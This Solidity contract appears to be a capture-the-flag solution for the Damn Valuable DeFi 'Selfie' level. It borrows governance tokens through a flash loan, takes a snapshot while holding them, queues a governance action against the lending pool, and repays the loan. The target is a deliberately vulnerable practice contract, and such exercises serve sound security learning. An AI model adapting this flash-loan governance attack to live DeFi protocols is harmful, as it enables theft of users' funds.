// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieAttack is IERC3156FlashBorrower {

    SelfiePool public selfiePool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public dvt;
    address public player;

    constructor(SelfiePool _selfiePool, DamnValuableTokenSnapshot _dvt, SimpleGovernance _governance) {
        selfiePool = _selfiePool;
        dvt = _dvt;
        governance = _governance;
        player = msg.sender;
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata data
    ) external returns (bytes32) {
        dvt.snapshot();
        governance.queueAction(address(selfiePool), 0, data);
        dvt.approve(address(selfiePool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack(uint256 amount, bytes calldata data) public {
        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(dvt), amount, data);
    }
}
